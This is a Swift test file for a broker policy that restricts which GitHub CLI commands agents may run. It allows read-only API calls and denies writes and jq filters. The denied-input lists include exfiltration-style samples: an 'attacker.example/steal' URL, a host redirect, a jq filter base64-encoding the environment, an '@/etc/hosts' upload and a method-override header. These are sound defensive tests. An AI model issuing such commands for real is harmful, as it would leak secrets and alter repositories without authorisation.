import Foundation
import Testing
@testable import HostControlToolSupport

@Suite("GitHub host-control read policy")
struct GitHubHostControlPolicyTests {
    /// Read-only REST calls agents made in production that the broker refused
    /// before `gh api` GETs were exposed.
    @Test("REST GETs on github.com are allowed", arguments: [
        ["api", "repos/example/project/commits/main"],
        ["api", "--method", "GET", "repos/example/project/contents/src/a.py?ref=e100", "-H", "Accept: application/vnd.github.raw+json"],
        ["api", "repos/example/project/pulls/107/files", "--paginate"],
        ["api", "repos/example/project/pulls/997/files?per_page=5&page=4"],
        ["api", "-XGET", "repos/example/project/branches/main"],
        ["api", "--method=head", "repos/example/project"],
        ["api", "-iX", "GET", "repos/example/project"],
        ["api", "repos/{owner}/{repo}/compare/a...b", "--paginate", "--slurp", "--silent"],
        ["api", "--hostname", "github.com", "--cache", "1h", "repos/example/project", "-t", "{{.name}}"]
    ])
    func allowsReads(_ arguments: [String]) {
        #expect(GitHubHostControlPolicy.denialReason(for: arguments, environment: [:]) == nil)
    }

    /// gojq's `env` and `$ENV` read the broker's environment, and no scan of the
    /// filter text keeps them out, so every filter is refused.
    @Test("jq filters stay refused", arguments: [
        ["pr", "view", "7", "--json", "number", "--jq", ".number"],
        ["pr", "view", "7", "--json", "number", "--jq", "env"],
        ["pr", "view", "7", "--json", "number", "--jq=.number"],
        ["pr", "view", "7", "--json", "number", "-qenv"],
        ["pr", "view", "7", "--json", "number", "-cq", ".number"],
        ["pr", "view", "7", "--json", "number", "--jq", "\"\u{301}\" + (env | tojson | @base64)"],
        ["api", "repos/example/project/commits/main", "--jq", ".sha"],
        ["auth", "status", "--json", "hosts", "--jq", ".hosts"]
    ])
    func deniesJQ(_ arguments: [String]) throws {
        let reason = try #require(GitHubHostControlPolicy.denialReason(for: arguments))
        #expect(reason.contains("jq filters are not exposed"))
    }

    @Test("API writes and wider requests stay denied", arguments: [
        ["api", "--method", "DELETE", "/repos/example/project"],
        ["api", "-X", "PATCH", "repos/example/project", "-f", "name=x"],
        ["api", "-XPOST", "repos/example/project/issues"],
        ["api", "repos/example/project/issues", "-f", "title=bug"],
        ["api", "repos/example/project/issues", "--raw-field=title=bug"],
        ["api", "repos/example/project/issues", "-F", "body=@/etc/hosts"],
        ["api", "--method", "GET", "search/issues", "-f", "q=repo:example/project"],
        ["api", "repos/example/project/issues", "--input", "payload.json"],
        ["api", "graphql", "-f", "query={viewer{login}}"],
        ["api", "graphql"],
        ["api", "/graphql"],
        ["api", "https://attacker.example/steal"],
        ["api", "--hostname", "attacker.example", "repos/example/project"],
        ["api", "--hostname=enterprise.example", "repos/example/project"],
        ["api", "--hostname", "", "repos/example/project"],
        ["api", "repos/example/project", "-H", "X-HTTP-Method-Override: DELETE"],
        ["api", "repos/example/project", "--verbose"],
        ["api", "repos/example/project", "--template=", "--method=DELETE"],
        ["api", "repos/example/project", "--cache=", "-XDELETE"],
        ["api", "repos/example/project", "repos/other/project"],
        ["api"],
        ["api", "repos/example/project", "--unknown-flag"]
    ])
    func deniesNonReads(_ arguments: [String]) throws {
        let reason = try #require(GitHubHostControlPolicy.denialReason(for: arguments))
        #expect(reason.contains("does not allow GitHub operation"))
    }

    @Test("An inherited GH_HOST away from github.com needs an explicit github.com host")
    func defaultHostStaysOnGitHub() throws {
        let arguments = ["api", "user"]
        let enterprise = ["GH_HOST": "ghe.example.com"]
        let reason = try #require(GitHubHostControlPolicy.denialReason(for: arguments, environment: enterprise))
        #expect(reason.contains("GH_HOST points away from github.com"))
        #expect(GitHubHostControlPolicy.denialReason(
            for: ["api", "--hostname", "github.com", "user"], environment: enterprise
        ) == nil)
        #expect(GitHubHostControlPolicy.denialReason(for: arguments, environment: ["GH_HOST": "github.com"]) == nil)
        #expect(GitHubHostControlPolicy.denialReason(for: arguments, environment: [:]) == nil)
        // Only `api` is new here; other reads already follow GH_HOST.
        #expect(GitHubHostControlPolicy.denialReason(for: ["pr", "view", "1"], environment: enterprise) == nil)
    }

    @Test("Browser launch and token display stay denied with their own reasons")
    func keepsExistingDenials() throws {
        let web = try #require(GitHubHostControlPolicy.denialReason(for: ["pr", "view", "1", "--web"]))
        #expect(web.contains("opening a browser"))
        let bundledWeb = try #require(GitHubHostControlPolicy.denialReason(for: ["pr", "view", "1", "-cw"]))
        #expect(bundledWeb.contains("opening a browser"))
        let token = try #require(GitHubHostControlPolicy.denialReason(for: ["auth", "status", "--show-token"]))
        #expect(token.contains("credential and token display"))
        #expect(GitHubHostControlPolicy.denialReason(for: ["auth", "token"]) != nil)
        #expect(GitHubHostControlPolicy.denialReason(for: ["pr", "create", "--title", "x"]) != nil)
        #expect(GitHubHostControlPolicy.denialReason(for: ["run", "watch", "1"]) != nil)
    }
}
